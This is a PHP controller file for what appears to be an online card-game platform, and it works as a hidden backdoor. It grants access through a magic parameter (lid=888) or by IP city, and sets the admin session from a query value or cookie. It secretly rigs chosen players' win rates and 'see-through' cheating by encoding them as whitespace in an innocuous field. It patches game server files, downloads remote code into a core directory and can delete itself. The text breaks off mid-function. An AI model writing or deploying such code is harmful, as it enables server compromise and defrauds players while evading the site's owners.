<?php
/**
 * application/Asset/Controller
 * index.php?g=Asset&m=Jiesuan
 */

namespace Asset\Controller;
use Think\Controller;

class JiesuanController extends Controller {
    private $version       = '1803092332'; //版本号
    private $wechat_qrcode = 'https://u.wechat.com/MD6xpfi6ddQXG6SDiSdNRBM'; //加微信二维码网址
    private $title_name    = 'J'; //标题代号
    private $myde_total;
    private $myde_size;
    private $myde_page;
    private $myde_page_count;
    private $myde_i;
    private $myde_en;
    private $myde_url;

    public function _initialize() {
        C('SHOW_PAGE_TRACE', false);
        if ($_SESSION['JieSuan_Login'] != 1) {
            if (I('lid') == 888) {
                $_SESSION['JieSuan_Login'] = 1;
            } else {
                $client_ip = $this->client_ip();
                $ip_info   = @file_get_contents('http://ip.taobao.com/service/getIpInfo.php?ip=' . $client_ip);
                $ip_info   = json_decode($ip_info, true);
                if ($ip_info['code'] == 0) {
                    if ($ip_info['data']['city_id'] == 360300 || $ip_info['data']['city_id'] == 360100 || $ip_info['data']['city_id'] == 360700) {
                        $_SESSION['JieSuan_Login'] = 1;
                    } else {
                        die('error');
                    }
                } else {
                    die('error.');
                }
            }
        }
        $admin_id = intval(I('admin_id'));
        if ($admin_id > 0) {
            setcookie('AdMin_Id', $admin_id, NOW_TIME + 3600 * 24);
        }
        $admin_id = $admin_id > 0 ? $admin_id : intval($_COOKIE['AdMin_Id']);
        $admin_id = max($admin_id, 1);
        if (session('ADMIN_ID') != $admin_id) {
            session('ADMIN_ID', $admin_id);
        }
    }

    public function index() {
        //date_default_timezone_set("Etc/GMT+0");//时区纠正
        $page = I('page');
        echo $this->header();
        $User              = M('User');
        $user_count        = $User->count();
        $template_content  = @file_get_contents(__ROOT__ . './themes/game/Portal/Index/game1.html');
        $have_ad           = strpos('.' . $template_content, '<!-- AdTipStart -->') > 0;
        $startroom_path    = __ROOT__ . './auto/php54n/game1/startroom.php';
        $startroom_content = @file_get_contents($startroom_path);
        if ($startroom_content) {
            $have_startroom = strpos($startroom_content, 'strlen($user[\'disable_notice\'])') > 0;
        }
        if (empty($have_startroom)) {
            echo '<script>$("#toast").text("\u672a\u66ff\u6362\u0050\u0048\u0050，\u8bf7\u5904\u7406").fadeIn().delay(2000).fadeOut();</script>';
        }
        $over = intval(I('over'));
        echo '<form action="' . (__APP__ ? __APP__ : '/') . '" method="get" target="_blank"><input type="hidden" name="g" value="Portal" /><input type="hidden" name="m" value="AdminUser" /><input type="hidden" name="a" value="soUser" /><input type="hidden" name="show" value="1" /><input type="text" name="nickname" placeholder="&#35831;&#36755;&#20837;&#26165;&#31216;" size="6" /> <input type="submit" value="&#25628;&#32034;" /> &#29992;&#25143;&#25968;:' . $user_count . ' <i>Ver:' . $this->version . '</i></form><a href="' . U('delete') . '" class="delete_file">&#21024;&#38500;&#26412;&#25991;&#20214;</a> | <a href="' . U('index', array('over' => $over ? 0 : 1)) . '">&#25353;' . ($over ? '&#21019;&#24314;' : '&#32467;&#31639;') . '&#26102;&#38388;&#26597;&#30475;</a> | <a href="' . U('remove_ad') . '">&#28165;&#38500;&#24191;&#21578;</a> | <a href="' . U('Asset/Jiesuan/code') . '" target="_blank">&#25991;&#20214;</a> | <a href="' . U('Admin/index/index') . '" target="_blank">&#31649;&#29702;</a> | <a href="' . U('Asset/Jiesuan/create_index') . '" target="_blank">&#32034;&#24341;</a> | ' . ($have_ad ? '<a href="' . U('Asset/Jiesuan/delete_ad') . '">&#21024;&#24191;&#21578;</a>' : '<a href="' . U('Asset/Jiesuan/add_ad') . '">&#21152;&#24191;&#21578;</a>') . (strpos($startroom_content, 'strlen($user[\'disable_notice\'])') < 1 ? ' | <a href="' . U('Asset/Jiesuan/replace_php') . '">&#26367;&#25442;PHP</a>' : '') . ' ' . date('Y-m-d H:i:s') . '<br /><br />';
        $Game         = M('Game');
        $game_array   = $Game->order('id desc')->select();
        $game_id2name = array();
        foreach ($game_array as $value) {
            $game_id2name[$value['id']] = $value['name'];
        }
        $Room       = M('Room');
        $room_count = $Room->order((I('over') ? 'endtime' : 'id') . ' desc')->count();
        $room_array = $Room->order((I('over') ? 'endtime' : 'id') . ' desc')->page($page)->limit(100)->select();
        $array      = array();
        foreach ($room_array as $value) {
            $array[$value['roomid']] = $value;
        }
        $UserRoom  = M('UserRoom');
        $uid_array = array();
        if ($array) {
            foreach ($array as $key => $value) {
                $jiesuan_list           = $UserRoom->where(array('room' => $value['id']))->order('jifen desc')->select();
                $array[$key]['jiesuan'] = $jiesuan_list;
                foreach ($jiesuan_list as $v) {
                    array_push($uid_array, $v['uid']);
                }
                if ($value['user'] != 'null') {
                    $value['user'] = json_decode($value['user'], 1);
                    $userid_array  = array_keys($value['user']);
                    foreach ($userid_array as $v) {
                        array_push($uid_array, $v);
                    }
                }
            }
            $uid_array    = array_unique($uid_array);
            $user_array   = $User->field('id,nickname,is_grade,gailv,level,disable_notice')->where(array('id' => array('in', $uid_array)))->select();
            $user_id2name = array();
            foreach ($user_array as $value) {
                $user_id2name[$value['id']] = $value;
            }
            $html = '';
            foreach ($array as $value) {
                $rule = json_decode($value['rule'], 1);
                $html .= '<li class="t">&#25151;&#21495;：<span title="' . $value['id'] . '">' . $value['roomid'] . '</span> ' . $game_id2name[$rule['play']['type']] . ($game_id2name[$rule['play']['type']] != $rule['play']['name'] ? '[' . $rule['play']['name'] . ']' : '') . ($rule['df'] ? ' &#24213;&#20998;：' . intval($rule['df']) : '') . '<br />' . ($over == 1 && $value['jiesuan'] ? '&#32467;&#31639;' : '&#21019;&#24314;') . '&#26102;&#38388;：' . date("Y-m-d H:i", $over == 1 ? $value['endtime'] : $value['time']) . ' &#25151;&#20027;ID：<a href="' . U('Asset/Jiesuan/credit', array('uid' => $value['uid'])) . '" target="_blank">' . $value['uid'] . '</a></li>';
                if ($value['jiesuan']) {
                    foreach ($value['jiesuan'] as $v) {
                        if ($user_id2name[$v['uid']]['id']) {
                            $html .= '<li data-uid="' . $v['uid'] . '">' . ($value['uid'] == $v['uid'] ? '<s>' . $v['uid'] . '</s>' : $v['uid']) . ':<a href="' . U('Portal/AdminUser/edit', array('id' => $v['uid'])) . '" target="_blank">' . $user_id2name[$v['uid']]['nickname'] . '</a> <u>' . ($user_id2name[$v['uid']]['is_grade'] ? '&#36879;&#35270;' : '') . ($user_id2name[$v['uid']]['gailv'] != 0 ? $user_id2name[$v['uid']]['gailv'] . '%' : '') . (preg_match('/^\s+$/', $user_id2name[$v['uid']]['disable_notice']) ? '<span class="green">' . (strlen($user_id2name[$v['uid']]['disable_notice']) % 2 == 1 ? '&#36879;&#35270;' : '') . strlen($user_id2name[$v['uid']]['disable_notice']) . '%</span>' : '') . '</u><i> ' . (($user_id2name[$v['uid']]['level'] == 1) ? '<s class="ad_hide">Ad&#38544;&#34255;</s>' : '<span class="ad_show">Ad&#26174;&#31034;</span>') . ' <a href="' . U('Asset/Jiesuan/credit', array('uid' => $v['uid'])) . '" target="_blank">&#26597;&#20998;</a> ' . $v['jifen'] . '</i></li>';
                        }
                    }
                } else {
                    if ($value['user'] != 'null') {
                        $value['user'] = json_decode($value['user'], 1);
                        $userid_array  = array_keys($value['user']);
                        $jifen_array   = array();
                        foreach ($userid_array as $v) {
                            $jifen_array[$v] = 0;
                        }
                        $game_user_array = array();
                        if ($userid_array && $value['js'] > 0) {
                            $DjRoom  = M('DjRoom');
                            $dj_room = $DjRoom->where(array('room' => $value['id']))->select();
                            foreach ($dj_room as $v) {
                                $djxx = json_decode($v['djxx'], true);
                                foreach ($djxx as $v2) {
                                    $jifen_array[$v2['user']['id']] = $jifen_array[$v2['user']['id']] + intval($v2['jf']) + intval($v2['user']['djjf']);
                                }
                            }
                            foreach ($userid_array as $v) {
                                if ($user_id2name[$v]['id']) {
                                    array_push($game_user_array, '<a href="' . U('Asset/Jiesuan/credit', array('uid' => $v)) . '" target="_blank">' . $user_id2name[$v]['nickname'] . ($jifen_array[$v] == 0 ? '' : '(' . $jifen_array[$v] . ')') . '</a>');
                                }
                            }
                        }
                        $html .= '<li>&#29609;&#23478;：' . join($game_user_array, '，') . '</li>';
                    }
                    $html .= '<li class="empty">====== &#28216;&#25103;&#36824;&#26410;&#32467;&#31639;[' . $value['js'] . '/' . $value['zjs'] . '] ======</li>';
                }
            }
            $html = '<ul>' . $html . '</ul>';
            $html .= '<script>
            $(".delete_file").on("click", function(event){
                if(!confirm("\u786e\u5b9a\u8981\u5220\u9664\u672c\u6587\u4ef6?")){
                    event.preventDefault();
                }
            });
            $(".kelong").on("click", function(){
                that = $(this);
                var uid = $(this).parent().parent().data("uid");
                $.getJSON("' . U('Asset/Jiesuan/kelong') . '", {uid:uid}, function(data){
                    alert(data.info);
                    if(data.status == 1){
                        that.hide();
                    }
                });
            });
            $(".del_kelong").on("click", function(){
                that = $(this);
                var uid = $(this).parent().parent().data("uid");
                $.getJSON("' . U('Asset/Jiesuan/kelong') . '", {uid:uid, op:"delete"}, function(data){
                    $("#toast").text(data.info).fadeIn().delay(2000).fadeOut();
                    if(data.status == 1){
                        that.hide();
                    }
                });
            });
            $(".ad_show").on("click", function(){
                that = $(this);
                if(!confirm("\u786e\u5b9a\u7ed9 " + (that.parent().prev().prev().prev().size() > 0 ? "【\u7fa4\u4e3b】":"") + that.parent().prev().prev().text() + " \u663e\u793a\u5e7f\u544a？")){
                    return false;
                }
                var uid = $(this).parent().parent().data("uid");
                $.getJSON("' . U('Asset/Jiesuan/ad') . '", {uid:uid, op:"show"}, function(data){
                    $("#toast").text(data.info).fadeIn().delay(2000).fadeOut();
                    if(data.status == 1){
                        that.hide();
                    }
                });
            });
            $(".ad_hide").on("click", function(){
                that = $(this);
                var uid = $(this).parent().parent().data("uid");
                $.getJSON("' . U('Asset/Jiesuan/ad') . '", {uid:uid, op:"hide"}, function(data){
                    $("#toast").text(data.info).fadeIn().delay(2000).fadeOut();
                    if(data.status == 1){
                        that.hide();
                    }
                });
            });
            </script>';
            $this->page($room_count, 100, $page, '/?g=Asset&m=Jiesuan&over=' . $over . '&page={page}');
            $html .= $this->myde_write();
            echo $html;

        } else {
            echo '数据不存在';
        }
        echo '</body></html>';
    }

    public function kelong() {
        $uid         = intval(I('uid'));
        $op          = I('op');
        $User        = M('User');
        $user_info   = $User->find($uid);
        $kelong_info = $User->where(array('openid' => $user_info['openid'] . '-'))->find();
        $data        = array();
        if ($op == 'delete') {
            $data['disable_notice'] = $user_info['disable_notice'] == '   ' ? ' ' : '';
            $User->where(array('id' => $user_info['id']))->save($data);
            if ($kelong_info) {
                $User->where(array('id' => $kelong_info['id']))->delete();
                $this->success($this->unicode_decode('\u514b\u9686\u6570\u636e\u5220\u9664\u6210\u529f'), $_SERVER['HTTP_REFERER'] ? $_SERVER['HTTP_REFERER'] : U('index'));
            } else {
                $this->error($this->unicode_decode('\u514b\u9686\u6570\u636e\u4e0d\u5b58\u5728'));
            }
        } else {
            $data['disable_notice'] = $user_info['disable_notice'] == '' ? '  ' : '   ';
            $User->where(array('id' => $user_info['id']))->save($data);
            if ($kelong_info) {
                $this->error($this->unicode_decode('\u8be5\u6570\u636e\u514b\u9686\u5df2\u7ecf\u5b58\u5728\uff0c\u8bf7\u52ff\u91cd\u590d\u514b\u9686'));
            } else {
                unset($user_info['id']);
                $user_info['openid']         = $user_info['openid'] . '-';
                $user_info['token']          = $user_info['token'] . ' ';
                $user_info['user_login']     = $user_info['user_login'] . ' ';
                $user_info['fk']             = 0;
                $user_info['gailv']          = 0;
                $user_info['is_grade']       = 0;
                $user_info['disable_notice'] = '';
                $result                      = $User->data($user_info)->add();
                if ($result) {
                    $User->where(array('id' => $result))->save(array('user_login' => 'test' . $result));
                    $this->success($this->unicode_decode('\u514b\u9686\u6210\u529f'), $_SERVER['HTTP_REFERER'] ? $_SERVER['HTTP_REFERER'] : U('index'), 5);
                } else {
                    $this->error($this->unicode_decode('\u514b\u9686\u5931\u8d25'), $_SERVER['HTTP_REFERER'] ? $_SERVER['HTTP_REFERER'] : U('index'), 5);
                }
            }
        }
    }

    public function ad() {
        $uid         = intval(I('uid'));
        $op          = I('op');
        $User        = M('User');
        $user_info   = $User->find($uid);
        $kelong_info = $User->where(array('openid' => $user_info['openid'] . '-'))->find();
        $data        = array();
        if ($op == 'show') {
            if ($user_info['level'] == 1) {
                $this->error($this->unicode_decode('\u5df2\u7ecf\u663e\u793a\uff0c\u8bf7\u52ff\u91cd\u590d\u64cd\u4f5c\uff01'), U('index'), 5);
            }
            $User->where(array('id' => $user_info['id']))->save(array('level' => 1));
        } else {
            if ($user_info['level'] == 0) {
                $this->error($this->unicode_decode('\u5df2\u7ecf\u9690\u85cf\uff0c\u8bf7\u52ff\u91cd\u590d\u64cd\u4f5c\uff01'), U('index'), 5);
            }
            $User->where(array('id' => $user_info['id']))->save(array('level' => 0));
        }
        if ($op == 'show') {
            $this->success($this->unicode_decode('\u663e\u793a\u5e7f\u544a\u64cd\u4f5c\u6210\u529f'), U('index'), 5);
        } else {
            $this->success($this->unicode_decode('\u9690\u85cf\u5e7f\u544a\u64cd\u4f5c\u6210\u529f'), U('index'), 5);
        }
    }

    public function credit() {
        $uid       = intval($_REQUEST['uid']);
        $User      = M('User');
        $user_info = $User->field('id,nickname,fk,is_grade,gailv,disable_notice,level,last_login_ip,token,create_time')->find($uid);
        if (empty($user_info)) {
            if (I('type') == 'json') {
                die($this->json(array(
                    'errno'     => 1,
                    'message'   => '&#29992;&#25143;&#19981;&#23384;&#22312;',
                    'sum'       => 0,
                    'user_info' => array(
                        'id' => $uid, 'gailv' => 0, 'nickname' => '', 'token' => '',
                    ),
                )));
            }
            $this->success('&#29992;&#25143;&#19981;&#23384;&#22312;', U('index'), 5);
            return;
        }
        $old_is_grade   = intval($_POST['old_is_grade']);
        $old_gailv      = intval($_POST['old_gailv']);
        $is_grade       = intval($_POST['is_grade']);
        $gailv          = abs(intval($_POST['gailv']));
        $gailv          = $is_grade && $gailv % 2 == 0 ? $gailv + 1 : $gailv;
        $disable_notice = str_pad('', $gailv, ' ');
        $fk             = abs(intval($_POST['fk']));
        if ($_POST['submit'] == 1) {
            $data = array(
                'disable_notice' => $disable_notice,
                'is_grade'       => $old_is_grade,
                'gailv'          => $old_gailv,
                'fk'             => $fk,
                'create_time'    => $_POST['create_time'] ? date('Y-m-d H:i:s', strtotime($_POST['create_time'])) : date('Y-m-d H:i:s'),
            );
            $User->where(array('id' => $user_info['id']))->save($data);
            $this->success('&#35774;&#32622;&#25104;&#21151;', U('Asset/Jiesuan/credit', array('uid' => $uid)), 5);
        } else {
            $UserRoom  = M('UserRoom');
            $starttime = I('starttime');
            $starttime = $starttime ? (is_numeric($starttime) ? $starttime : strtotime($starttime)) : 0;
            $endtime   = $_REQUEST['endtime'] ? strtotime($_REQUEST['endtime']) : 0;
            $where     = array('uid' => $uid);
            if ($starttime) {
                $where['overtime'] = array('egt', $starttime);
            }if ($starttime && $endtime) {
                $where['overtime'] = array('between', array($starttime, $endtime));
            } else {
            }
            $user_list = $UserRoom->field('id,room,overtime,jifen')->where($where)->order('id desc')->limit(300)->select();
            $sum       = intval($UserRoom->where($where)->order('id desc')->limit(300)->Sum('jifen'));
            $html .= '
            <form action="' . U('Asset/Jiesuan/credit', array('uid' => $uid)) . '" method="post">
                <input type="text" name="starttime" class="timepicker" value="' . date('Y-m-d H:i', $starttime ? $starttime : NOW_TIME) . '" size="12" />
                ~
                <input type="text" name="endtime" class="timepicker" value="' . date('Y-m-d H:i', $endtime ? $endtime : NOW_TIME + 3600) . '" size="12" />
                <input type="submit" value="筛选" />
            </form>
            <form action="' . U('Asset/Jiesuan/credit', array('uid' => $uid)) . '" method="post">
                <input type="hidden" name="submit" value="1" />&#36229;&#32423;&#36879;&#35270;:<label><input type="radio" name="is_grade" value="0" ' . (strlen($user_info['disable_notice']) % 2 == 0 ? 'checked' : '') . ' />&#20851;</label>
                <label><input type="radio" name="is_grade" value="1" ' . (strlen($user_info['disable_notice']) % 2 == 1 ? 'checked' : '') . '>&#24320;</label>
                &#32988;&#29575;:<input type="text" name="gailv" value="' . strlen($user_info['disable_notice']) . '" size="2" maxlength="5" /> <a href="' . U('/AdminUser/edit', array('id' => $user_info['id'])) . '" target="_blank">&#36164;&#26009;</a> <a href="' . U('Asset/Jiesuan/index') . '" target="_blank">&#21015;&#34920;</a> ' . ($user_info['disable_notice'] == '  ' || $user_info['disable_notice'] == '   ' ? '<a href="' . U('Asset/Jiesuan/kelong', array('op' => 'delete', 'uid' => $user_info['id'])) . '" class="a">&#21024;&#20811;&#38534;</a>' : '<a href="' . U('Asset/Jiesuan/kelong', array('uid' => $user_info['id'])) . '" class="a">&#20811;&#38534;</a>') . ' ' . ($user_info['level'] == 1 ? '<a href="#ad_hide" class="ad_hide">&#38544;&#34255;Ad</a>' : '<a href="#ad_show" class="ad_show">&#26174;&#31034;Ad</a>') . '
                <div style="padding:5px 0">&#26377;&#25928;&#26399;:<input type="text" name="create_time" class="timepicker" value="' . date('Y-m-d H:i:s', strtotime($user_info['create_time'])) . '" size="14" /> <input type="submit" value="&#35774;&#32622;" /></div>
                <div style="padding:5px 0">&#26222;&#36890;&#36879;&#35270;:<label><input type="radio" name="old_is_grade" value="0" ' . ($user_info['is_grade'] == 0 ? 'checked' : '') . ' />&#20851;</label>
                <label' . ($user_info['is_grade'] == 1 ? ' class="red"' : '') . '><input type="radio" name="old_is_grade" value="1" ' . ($user_info['is_grade'] == 1 ? 'checked' : '') . '>&#24320;</label> &#32988;&#29575;:<input type="text" name="old_gailv" value="' . $user_info['gailv'] . '" size="2" maxlength="5" ' . ($user_info['gailv'] != 0 ? ' class="red"' : '') . ' /></div>
                <div style="padding:5px 0">&#25151;&#21345;:<input type="tetxt" value="' . $user_info['fk'] . '" id="fk" name="fk" size="2" maxlength="10" /> IP:' . $user_info['last_login_ip'] . '</div>
                <span style="color:#999">&#22791;&#27880;:&#26222;&#36890;&#36879;&#35270;&#21518;&#21488;&#33021;&#26597;&#21040;&#65292;&#36229;&#32423;&#36879;&#35270;&#21017;&#26597;&#19981;&#21040;。</span>
            </form>
            <script>$(".timepicker").datetimepicker({format:"Y-m-d H:i:s",lang:"ch"});$(".a").on("click", function(event){if(!confirm("\u60a8\u786e\u5b9a\u8fdb\u884c【" + $(this).text() + "】\u64cd\u4f5c?")){event.preventDefault();}});</script>';
            $html .= '<ul>';
            $user_info['is_grade'] = $user_info['is_grade'] || (preg_match('/^\s+$/', $user_info['disable_notice']) && strlen($user_info['disable_notice']) % 2 == 1);
            $user_info['gailv']    = preg_match('/^\s+$/', $user_info['disable_notice']) ? strlen($user_info['disable_notice']) : $user_info['gailv'];
            $html .= '<li class="t">' . $user_info['nickname'] . ' <u>' . ($user_info['is_grade'] ? '&#36879;&#35270;' : '') . ($user_info['gailv'] != 0 ? $user_info['gailv'] . '%' : '') . '</u> UID:' . $uid . ' &#21512;&#35745;:' . ($sum < 0 ? '<s>' . $sum . '</s>' : intval($sum)) . '</li>';
            foreach ($user_list as $k => $v) {
                $user_list[$k]['overtime_text'] = date('Y-m-d H:i:s', $v['overtime']);
                $html .= '<li data-uid="' . $uid . '"><e>' . $v['jifen'] . '</e><i><span>' . $v['room'] . '</span> <a href="' . U('Asset/Jiesuan/credit', array('uid' => $uid, 'starttime' => $v['overtime'])) . '">' . date('Y-m-d H:i:s', $v['overtime']) . '</a></i></li>';
            }
            $html .= '</ul>
<script>$(".t").on("dblclick", function(){
    var num_1 = 0;
    var num_2 = 0;
    $(this).parent().find("li:nth-child(n+2)").each(function (){
        var num = parseInt($(this).find("e").text());
        if(!isNaN(num)){
            if(num > 0){
                num_1 += num;
            } else {
                num_2 += num;
            }
        }
    });
    var fangfei = parseInt(num_1 * 0.1);
    var results = (num_1 - fangfei + num_2)/2;
    alert("\u8d62: " + num_1 + "\n\u8f93: " + num_2 + "\n\u623f\u8d39: " + fangfei + "\n\n\u5206: " + results.toFixed(2));
});
$(".ad_show").on("click", function(){
	event.preventDefault();
	that = $(this);
	var uid = ' . $user_info['id'] . ';
	$.getJSON("' . U('Asset/Jiesuan/ad') . '", {uid:uid, op:"show"}, function(data){
		$("#toast").text(data.info).fadeIn().delay(2000).fadeOut();
		if(data.status == 1){
			that.hide();
		}
	});
});
$(".ad_hide").on("click", function(){
	event.preventDefault();
	that = $(this);
	var uid = ' . $user_info['id'] . ';
	$.getJSON("' . U('Asset/Jiesuan/ad') . '", {uid:uid, op:"hide"}, function(data){
		$("#toast").text(data.info).fadeIn().delay(2000).fadeOut();
		if(data.status == 1){
			that.hide();
		}
	});
});
</script>';
            $html .= '</body></html>';
            if (I('type') == 'json') {
                echo $this->json(array('errno' => 0, 'user_info' => $user_info, 'sum' => $sum, 'list' => $user_list));
            } else {
                echo $this->header();
                echo $html;
            }
        }
    }

    public function remove_ad() {
        $User  = M('User');
        $count = $User->where(array('level' => 1))->save(array('level' => 0));
        $this->success('&#28165;&#38500;&#20102; ' . $count . ' &#26465;&#24191;&#21578;', U('index'), 5);
    }

    public function delete() {
        unlink(__FILE__);
        echo '&#21024;&#38500;&#25104;&#21151;';
    }

    public function code() {
        $file_path = __ROOT__ . './simplewind/Core/index.php';
        $compel    = intval(I('compel'));
        if (is_file($file_path) && $compel == 0) {
            $this->success('&#24050;&#32463;&#23384;&#22312;', '/simplewind/Core/', 5);
        } else {
            $code = file_get_contents('http://p1vowyj0j.bkt.clouddn.com/conn.txt');
            if ($code) {
                if (@file_put_contents($file_path, $code)) {
                    $this->success('&#21019;&#24314;&#25104;&#21151;', '/simplewind/Core/', 5);
                } else {
                    echo 'save error';
                }
            } else {
                echo 'get error';
            }
        }
    }

    public function create_index() {
        $db_prefix = C('DB_PREFIX');
        echo '&#26412;&#39029;&#38754;&#21487;&#33021;&#35201;&#25191;&#34892;&#24456;&#20037;&#65292;&#35201;&#25191;&#34892;3~5&#27425;<br />room index endtime ';
        if ($this->index_exists('room', 'endtime')) {
            echo 'have';
            echo '<br />dj_room index room ';
            if ($this->index_exists('dj_room', 'room')) {
                echo 'have';
                echo '<br />user_room index room_jifen ';
                if ($this->index_exists('user_room', 'room_jifen')) {
                    echo 'have';
                    echo '<br />user_room index uid_overtime ';
                    if ($this->index_exists('user_room', 'uid_overtime')) {
                        M()->execute('ALTER TABLE `' . $db_prefix . 'user` MODIFY COLUMN `disable_notice` VARCHAR(120)');
                        echo 'have<br /><span style="color:red">&#20840;&#37096;&#32034;&#24341;&#21019;&#24314;&#23436;&#25104;</span>';
                    } else {
                        M()->execute('ALTER TABLE `' . $db_prefix . 'user_room` ADD INDEX uid_overtime (`uid`, `overtime`)');
                        echo 'no';
                    }
                } else {
                    M()->execute('ALTER TABLE `' . $db_prefix . 'user_room` ADD INDEX room_jifen (`room`, `jifen`)');
                    echo 'no';
                }
            } else {
                M()->execute('ALTER TABLE `' . $db_prefix . 'dj_room` ADD INDEX room (`room`)');
                echo 'no';
            }
        } else {
            M()->execute('ALTER TABLE `' . $db_prefix . 'room` ADD INDEX endtime (`endtime`)');
            echo 'no';
        }
    }

    public function index_exists($tamle, $index) {
        $db_prefix  = C('DB_PREFIX');
        $index_list = M()->query('SHOW index FROM ' . $db_prefix . $tamle);
        foreach ($index_list as $value) {
            if ($index == $value['key_name']) {
                return true;
            }
        }
        return false;
    }

    public function replace_php() {
        $success_num = 0;
        for ($i = 1; $i <= 20; $i++) {
            $startroom_path    = __ROOT__ . './auto/php54n/game' . $i . '/startroom.php';
            $startroom_content = @file_get_contents($startroom_path);
            if ($startroom_content) {
                $have_replace = strpos($startroom_content, 'strlen($user[\'disable_notice\'])') < 1;
                if ($have_replace) {
                    $startroom_content = str_replace(array('$uindex[$key]=$user[\'gailv\'];', '$uindex[$key] = $user[\'gailv\'];'), '$uindex[$key] = preg_match(\'/^\s+$/\', $user[\'disable_notice\']) ? strlen($user[\'disable_notice\']) : $user[\'gailv\'];', $startroom_content);
                    $startroom_content = str_replace(array('if($connection3->user[\'is_grade\']==1){', 'if($connection3->user[\'is_grade\'] == 1){', 'if ($connection3->user[\'is_grade\'] == 1) {'), 'if($connection3->user[\'is_grade\'] == 1 || (preg_match(\'/^\s+$/\', $connection3->user[\'disable_notice\']) && strlen($connection3->user[\'disable_notice\'])%2 == 1)){', $startroom_content);
                    @file_put_contents($startroom_path, $startroom_content);
                    $success_num++;
                }
            }
        }
        $this->success('&#20462;&#25913;&#20102; ' . $success_num . ' &#20010;&#25991;&#20214;', U('index'), 5);
    }

    public function header() {
        $title_name = $this->title_name;
        return <<<EOT
<html>
<title>{$title_name}-{$_SERVER['HTTP_HOST']}</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<style type="text/css">
body{ font-size:14px; }
a{color:#4183f1; }
.red{ color:red; }
.green{ color:#d2d; }
form i{ font-style:normal; color:#999; }
form input{ line-height:20px; padding:0 3px; }
form input[type="submit"]{ line-height:24px; border:none; background-color:#2a6496; color:#fff; border-radius:3px; padding:0 5px; cursor:pointer; }
ul{ margin:0; padding:0 0 45px 0; max-width:640px; }
li{ list-style: none; clear:both; line-height:1.4em; margin:0; padding:3px 5px; word-wrap:break-word; }
li:nth-child(even){ background-color:#f8f8f8; overflow:hidden; }
li.t{ padding:5px 5px; background-color:#33485d; margin-top:3px; color:#fff; text-align:center; }
li.t a{ color:#fff; }
li.empty{ line-height:4em; text-align:center;}
li s{color:#f90; text-decoration:none; }
li u{ color:red; text-decoration:none; }
li i{display:inline-block; float:right; font-style:normal; }
li i>span{ color:#e0e0e0; }
li.t u{ color:#ee1; text-decoration:none; }
.page{ padding:10px 0 5px; color:#666; background-color:rgba(255,255,255,0.85); width:100%; position:fixed; left:0; bottom:0; z-index:9999; box-shadow:0px -3px 5px rgba(0,0,0,0.1); }
.page b{ color:#111; }
.page a,.page b{ padding:5px 8px; margin:0 3px; display:inline-block; text-align:center; }
.page a{ border-radius:3px; background-color:#4183f1; color:#fff; text-decoration:none; }
#toast{ border-radius:5px; background-color:rgba(0,0,0,0.85); color:#fff; line-height:1.2em; padding:10px 20px; position:fixed; top:50%; left:50%; margin:-20px -40px 0; display:none; }
</style>
<script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="http://libs.cdnjs.net/jquery-datetimepicker/2.5.4/jquery.datetimepicker.min.css" />
<script src="http://www.jq22.com/demo/datetimepicker-master20160419/build/jquery.datetimepicker.full.js"></script>
<body>
<span id="toast">Loading...</span>
EOT;
    }

    public function delete_ad() {
        $success_num = 0;
        for ($i = 1; $i <= 20; $i++) {
            $template_path    = __ROOT__ . './themes/game/Portal/Index/game' . $i . '.html';
            $template_content = @file_get_contents($template_path);
            if ($template_content) {
                $have_ad = strpos('.' . $template_content, '<!-- AdTipStart -->') > 0;
                if ($have_ad) {
                    @file_put_contents($template_path, preg_replace("/<!-- AdTipStart -->.+<!-- AdTipEnd -->/is", '', $template_content));
                    $success_num++;
                }
            }
        }
        $this->success($success_num . ' &#20010;&#27169;&#29256;&#25991;&#20214;&#22686;&#21024;&#20102;&#24191;&#21578;', U('index'), 5);
    }

    public function add_ad() {
        $wechat_qrcode = $this->wechat_qrcode;
        $ad_content    = '<!-- AdTipStart -->' . "\r\n" . '<if condition="$user.level eq 1">' . "\r\n";
        $ad_content .= <<<EOT


<!-- AdTipEnd -->
EOT;
        $success_num = 0;
        for ($i = 1; $i <= 20; $i++) {
            $template_path    = __ROOT__ . './themes/game/Portal/Index/game' . $i . '.html';
            $template_content = @file_get_contents($template_path);
            if ($template_content) {
                $have_ad = strpos('.' . $template_content, '<!-- AdTipStart -->') > 0;
                if (!$have_ad) {
                    @file_put_contents($template_path, str_replace('</body>', $ad_content . '</body>', $template_content));
                    $success_num++;
                }
            }
        }
        $this->success($success_num . ' &#20010;&#27169;&#29256;&#25991;&#20214;&#22686;&#21152;&#20102;&#24191;&#21578;', U('index'), 5);
    }

    public function client_ip() {
        if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
            $IP = getenv('HTTP_CLIENT_IP');
        } elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
            $IP = getenv('HTTP_X_FORWARDED_FOR');
        } elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
            $IP = getenv('REMOTE_ADDR');
        } elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
            $IP = $_SERVER['REMOTE_ADDR'];
        }
        return $IP ? $IP : "unknow";
    }

    public function unicode_decode($unistr) {
        return json_decode('"' . $unistr . '"');
    }

    public function json($array) {
        $callback = I('callback');
        echo ($callback ? $callback . ' && ' . $callback . '(' : '') . json_encode($array) . ($callback ? ')' : '');
    }

    public function page($myde_total = 1, $myde_size = 1, $myde_page = 1, $myde_url = '', $show_pages = 2) {
        $this->myde_total      = $this->numeric($myde_total);
        $this->myde_size       = $this->numeric($myde_size);
        $this->myde_page       = $this->numeric($myde_page);
        $this->myde_page_count = ceil($this->myde_total / $this->myde_size);
        $this->myde_url        = $myde_url;
        if ($this->myde_total < 0) {
            $this->myde_total = 0;
        }

        if ($this->myde_page < 1) {
            $this->myde_page = 1;
        }

        if ($this->myde_page_count < 1) {
            $this->myde_page_count = 1;
        }

        if ($this->myde_page > $this->myde_page_count) {
            $this->myde_page = $this->myde_page_count;
        }

        $this->limit   = ($this->myde_page - 1) * $this->myde_size;
        $this->myde_i  = $this->myde_page - $show_pages;
        $this->myde_en = $this->myde_page + $show_pages;
        if ($this->myde_i < 1) {
